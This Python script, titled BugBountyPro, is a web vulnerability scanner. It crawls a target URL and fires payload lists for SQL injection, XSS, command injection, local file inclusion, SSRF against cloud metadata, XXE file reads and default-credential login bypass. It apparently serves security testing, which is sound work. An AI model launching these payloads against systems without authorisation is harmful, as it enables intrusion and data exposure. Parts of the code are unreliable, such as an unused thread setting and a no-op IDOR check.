#!/usr/bin/env python3
"""
BugBountyPro - Comprehensive Vulnerability Scanner
Author: Security Researcher
Version: 1.0
"""

import requests
import argparse
import sys
import time
import json
import urllib.parse
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
import threading
from queue import Queue
import random
import hashlib
import base64

class BugBountyPro:
    def __init__(self, target, threads=10, timeout=10, user_agent=None):
        self.target = target
        self.threads = threads
        self.timeout = timeout
        self.session = requests.Session()
        self.results = []
        self.discovered_urls = set()
        
        # Headers for requests
        self.headers = {
            'User-Agent': user_agent or 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
        }
        self.session.headers.update(self.headers)

    def log(self, message, level="INFO"):
        print(f"[{level}] {message}")

    # SQL Injection Scanner
    def sql_injection_scan(self, url, params=None):
        """Scan for SQL Injection vulnerabilities"""
        self.log(f"Testing SQL Injection on: {url}")
        
        sql_payloads = [
            "'",
            "';",
            "' OR '1'='1",
            "' OR 1=1--",
            "') OR ('1'='1",
            "admin'--",
            "1' ORDER BY 1--",
            "1' UNION SELECT 1,2,3--",
            "' AND 1=CAST((SELECT CURRENT_USER) AS INT)--"
        ]
        
        for payload in sql_payloads:
            try:
                if params:
                    # GET request with parameters
                    test_params = params.copy()
                    for key in test_params:
                        test_params[key] = payload
                    
                    response = self.session.get(url, params=test_params, timeout=self.timeout)
                else:
                    # Append to URL
                    test_url = f"{url}{payload}"
                    response = self.session.get(test_url, timeout=self.timeout)
                
                error_indicators = [
                    "sql syntax", "mysql_fetch", "ora-", "microsoft odbc",
                    "postgresql", "sybase", "warning: mysql", "unclosed quotation",
                    "you have an error in your sql"
                ]
                
                if any(indicator in response.text.lower() for indicator in error_indicators):
                    self.results.append({
                        'type': 'SQL Injection',
                        'url': url,
                        'payload': payload,
                        'confidence': 'High'
                    })
                    self.log(f"Potential SQL Injection found: {url} with payload: {payload}", "HIGH")
                    break
                    
            except Exception as e:
                self.log(f"Error testing SQLi: {e}", "ERROR")

    # XSS Scanner
    def xss_scan(self, url, params=None):
        """Scan for Cross-Site Scripting vulnerabilities"""
        self.log(f"Testing XSS on: {url}")
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "\"><script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>"
        ]
        
        for payload in xss_payloads:
            try:
                if params:
                    test_params = params.copy()
                    for key in test_params:
                        test_params[key] = payload
                    
                    response = self.session.get(url, params=test_params, timeout=self.timeout)
                else:
                    test_url = f"{url}{urllib.parse.quote(payload)}"
                    response = self.session.get(test_url, timeout=self.timeout)
                
                if payload.replace('<', '&lt;') not in response.text and payload in response.text:
                    self.results.append({
                        'type': 'XSS',
                        'url': url,
                        'payload': payload,
                        'confidence': 'Medium'
                    })
                    self.log(f"Potential XSS found: {url} with payload: {payload}", "MEDIUM")
                    break
                    
            except Exception as e:
                self.log(f"Error testing XSS: {e}", "ERROR")

    # RCE Scanner
    def rce_scan(self, url, params=None):
        """Scan for Remote Code Execution vulnerabilities"""
        self.log(f"Testing RCE on: {url}")
        
        rce_payloads = [
            ";id",
            "|id",
            "&&id",
            "`id`",
            "$(id)",
            "{{id}}",
            "<?php system('id'); ?>"
        ]
        
        for payload in rce_payloads:
            try:
                if params:
                    test_params = params.copy()
                    for key in test_params:
                        test_params[key] = payload
                    
                    response = self.session.get(url, params=test_params, timeout=self.timeout)
                else:
                    test_url = f"{url}{payload}"
                    response = self.session.get(test_url, timeout=self.timeout)
                
                if "uid=" in response.text or "gid=" in response.text or "www-data" in response.text:
                    self.results.append({
                        'type': 'RCE',
                        'url': url,
                        'payload': payload,
                        'confidence': 'High'
                    })
                    self.log(f"Potential RCE found: {url} with payload: {payload}", "HIGH")
                    break
                    
            except Exception as e:
                self.log(f"Error testing RCE: {e}", "ERROR")

    # CSRF Scanner
    def csrf_scan(self, url):
        """Scan for Cross-Site Request Forgery vulnerabilities"""
        self.log(f"Testing CSRF on: {url}")
        
        try:
            response = self.session.get(url, timeout=self.timeout)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            forms = soup.find_all('form')
            for form in forms:
                token_found = False
                inputs = form.find_all('input')
                
                for input_tag in inputs:
                    if input_tag.get('name', '').lower() in ['csrf', 'csrfmiddlewaretoken', 'authenticity_token', 'token']:
                        token_found = True
                        break
                
                if not token_found and form.get('action'):
                    self.results.append({
                        'type': 'CSRF',
                        'url': url,
                        'form_action': form.get('action'),
                        'confidence': 'Medium'
                    })
                    self.log(f"Potential CSRF vulnerability in form: {form.get('action')}", "MEDIUM")
                    
        except Exception as e:
            self.log(f"Error testing CSRF: {e}", "ERROR")

    # Authentication Bypass Scanner
    def auth_bypass_scan(self, login_url):
        """Scan for Authentication Bypass vulnerabilities"""
        self.log(f"Testing Authentication Bypass on: {login_url}")
        
        bypass_payloads = [
            {"username": "admin", "password": "admin"},
            {"username": "' or '1'='1", "password": "' or '1'='1"},
            {"username": "admin'--", "password": ""},
            {"username": "admin", "password": "password"},
            {"username": "administrator", "password": "administrator"}
        ]
        
        for payload in bypass_payloads:
            try:
                response = self.session.post(login_url, data=payload, timeout=self.timeout)
                
                if response.status_code == 200 and ("dashboard" in response.text.lower() or "welcome" in response.text.lower() or "logout" in response.text.lower()):
                    self.results.append({
                        'type': 'Authentication Bypass',
                        'url': login_url,
                        'payload': payload,
                        'confidence': 'High'
                    })
                    self.log(f"Potential Authentication Bypass: {login_url} with {payload}", "HIGH")
                    break
                    
            except Exception as e:
                self.log(f"Error testing auth bypass: {e}", "ERROR")

    # LFI Scanner
    def lfi_scan(self, url, params=None):
        """Scan for Local File Inclusion vulnerabilities"""
        self.log(f"Testing LFI on: {url}")
        
        lfi_payloads = [
            "../../../../etc/passwd",
            "....//....//....//....//etc/passwd",
            "../../../../windows/win.ini",
            "file:///etc/passwd",
            ".../.../.../.../.../etc/passwd"
        ]
        
        for payload in lfi_payloads:
            try:
                if params:
                    test_params = params.copy()
                    for key in test_params:
                        test_params[key] = payload
                    
                    response = self.session.get(url, params=test_params, timeout=self.timeout)
                else:
                    test_url = f"{url}{payload}"
                    response = self.session.get(test_url, timeout=self.timeout)
                
                if "root:" in response.text or "[extensions]" in response.text:
                    self.results.append({
                        'type': 'LFI',
                        'url': url,
                        'payload': payload,
                        'confidence': 'High'
                    })
                    self.log(f"Potential LFI found: {url} with payload: {payload}", "HIGH")
                    break
                    
            except Exception as e:
                self.log(f"Error testing LFI: {e}", "ERROR")

    # SSRF Scanner
    def ssrf_scan(self, url, params=None):
        """Scan for Server-Side Request Forgery vulnerabilities"""
        self.log(f"Testing SSRF on: {url}")
        
        # Use a canary token or internal IP
        ssrf_payloads = [
            "http://localhost:80",
            "http://127.0.0.1:22",
            "http://169.254.169.254/latest/meta-data/",
            "file:///etc/passwd",
            "http://internal.local"
        ]
        
        for payload in ssrf_payloads:
            try:
                if params:
                    test_params = params.copy()
                    for key in test_params:
                        test_params[key] = payload
                    
                    response = self.session.get(url, params=test_params, timeout=self.timeout)
                else:
                    test_url = f"{url}{payload}"
                    response = self.session.get(test_url, timeout=self.timeout)
                
                # Check for internal information in response
                if "AMI ID" in response.text or "instance-id" in response.text or "root:" in response.text:
                    self.results.append({
                        'type': 'SSRF',
                        'url': url,
                        'payload': payload,
                        'confidence': 'High'
                    })
                    self.log(f"Potential SSRF found: {url} with payload: {payload}", "HIGH")
                    break
                    
            except Exception as e:
                self.log(f"Error testing SSRF: {e}", "ERROR")

    # XXE Scanner
    def xxe_scan(self, url):
        """Scan for XML External Entity vulnerabilities"""
        self.log(f"Testing XXE on: {url}")
        
        xxe_payload = """<?xml version="1.0" encoding="ISO-8859-1"?>
        <!DOCTYPE foo [ <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
        <foo>&xxe;</foo>"""
        
        try:
            headers = {'Content-Type': 'application/xml'}
            response = self.session.post(url, data=xxe_payload, headers=headers, timeout=self.timeout)
            
            if "root:" in response.text:
                self.results.append({
                    'type': 'XXE',
                    'url': url,
                    'payload': xxe_payload,
                    'confidence': 'High'
                })
                self.log(f"Potential XXE found: {url}", "HIGH")
                
        except Exception as e:
            self.log(f"Error testing XXE: {e}", "ERROR")

    # IDOR Test
    def idor_test(self, base_url, id_param):
        """Test for Insecure Direct Object References"""
        self.log(f"Testing IDOR on: {base_url}")
        
        test_ids = [1, 2, 100, 1000, "test", "admin"]
        
        for test_id in test_ids:
            try:
                test_url = f"{base_url}?{id_param}={test_id}"
                response1 = self.session.get(test_url, timeout=self.timeout)
                
                # Test with different user context if possible
                response2 = self.session.get(test_url, timeout=self.timeout)
                
                if response1.status_code == 200 and response1.text != response2.text:
                    self.results.append({
                        'type': 'IDOR',
                        'url': test_url,
                        'test_id': test_id,
                        'confidence': 'Medium'
                    })
                    self.log(f"Potential IDOR found: {test_url}", "MEDIUM")
                    break
                    
            except Exception as e:
                self.log(f"Error testing IDOR: {e}", "ERROR")

    # Crawler to discover endpoints
    def crawl(self, base_url, max_pages=50):
        """Crawl the website to discover endpoints"""
        self.log(f"Starting crawl of: {base_url}")
        
        try:
            response = self.session.get(base_url, timeout=self.timeout)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Find all links
            for link in soup.find_all('a', href=True):
                href = link['href']
                full_url = urljoin(base_url, href)
                
                if base_url in full_url and full_url not in self.discovered_urls and len(self.discovered_urls) < max_pages:
                    self.discovered_urls.add(full_url)
                    self.log(f"Discovered: {full_url}")
            
            # Find all forms
            for form in soup.find_all('form'):
                action = form.get('action')
                if action:
                    full_url = urljoin(base_url, action)
                    if base_url in full_url and full_url not in self.discovered_urls:
                        self.discovered_urls.add(full_url)
                        self.log(f"Discovered form: {full_url}")
                        
        except Exception as e:
            self.log(f"Error during crawl: {e}", "ERROR")

    # Main scanner function
    def comprehensive_scan(self, scan_types=None):
        """Run comprehensive vulnerability scan"""
        if scan_types is None:
            scan_types = ['sql', 'xss', 'rce', 'csrf', 'auth', 'lfi', 'ssrf', 'xxe', 'idor']
        
        self.log(f"Starting comprehensive scan on: {self.target}")
        
        # First, crawl to discover endpoints
        self.crawl(self.target)
        
        # Add the base URL to discovered URLs
        self.discovered_urls.add(self.target)
        
        # Scan each discovered URL
        for url in self.discovered_urls:
            self.log(f"Scanning: {url}")
            
            if 'sql' in scan_types:
                self.sql_injection_scan(url)
            
            if 'xss' in scan_types:
                self.xss_scan(url)
            
            if 'rce' in scan_types:
                self.rce_scan(url)
            
            if 'csrf' in scan_types:
                self.csrf_scan(url)
            
            if 'lfi' in scan_types:
                self.lfi_scan(url)
            
            if 'ssrf' in scan_types:
                self.ssrf_scan(url)
            
            if 'idor' in scan_types:
                self.idor_test(url, 'id')
        
        # Specialized scans
        if 'auth' in scan_types:
            login_urls = [url for url in self.discovered_urls if 'login' in url.lower()]
            for login_url in login_urls:
                self.auth_bypass_scan(login_url)
        
        if 'xxe' in scan_types:
            xml_urls = [url for url in self.discovered_urls if any(x in url.lower() for x in ['xml', 'api', 'soap'])]
            for xml_url in xml_urls:
                self.xxe_scan(xml_url)

    def generate_report(self, output_file=None):
        """Generate a comprehensive report"""
        report = {
            'target': self.target,
            'scan_date': time.strftime('%Y-%m-%d %H:%M:%S'),
            'vulnerabilities_found': len(self.results),
            'vulnerabilities': self.results
        }
        
        print("\n" + "="*50)
        print("SCAN REPORT")
        print("="*50)
        print(f"Target: {self.target}")
        print(f"Vulnerabilities Found: {len(self.results)}")
        print("="*50)
        
        for vuln in self.results:
            print(f"\nType: {vuln['type']}")
            print(f"URL: {vuln['url']}")
            print(f"Confidence: {vuln['confidence']}")
            if 'payload' in vuln:
                print(f"Payload: {vuln['payload']}")
            print("-" * 30)
        
        if output_file:
            with open(output_file, 'w') as f:
                json.dump(report, f, indent=2)
            self.log(f"Report saved to: {output_file}")

def main():
    parser = argparse.ArgumentParser(description='BugBountyPro - Comprehensive Vulnerability Scanner')
    parser.add_argument('-u', '--url', required=True, help='Target URL')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Number of threads')
    parser.add_argument('-o', '--output', help='Output file for report')
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout')
    parser.add_argument('--scan-type', choices=['all', 'sql', 'xss', 'rce', 'csrf', 'auth', 'lfi', 'ssrf', 'xxe', 'idor'], 
                       default='all', help='Type of scan to perform')
    
    args = parser.parse_args()
    
    # Map scan types
    scan_types_map = {
        'all': ['sql', 'xss', 'rce', 'csrf', 'auth', 'lfi', 'ssrf', 'xxe', 'idor'],
        'sql': ['sql'],
        'xss': ['xss'],
        'rce': ['rce'],
        'csrf': ['csrf'],
        'auth': ['auth'],
        'lfi': ['lfi'],
        'ssrf': ['ssrf'],
        'xxe': ['xxe'],
        'idor': ['idor']
    }
    
    scanner = BugBountyPro(
        target=args.url,
        threads=args.threads,
        timeout=args.timeout
    )
    
    try:
        scanner.comprehensive_scan(scan_types_map[args.scan_type])
        scanner.generate_report(args.output)
    except KeyboardInterrupt:
        print("\nScan interrupted by user")
        scanner.generate_report(args.output)
    except Exception as e:
        print(f"Error during scan: {e}")

if __name__ == "__main__":
    main()
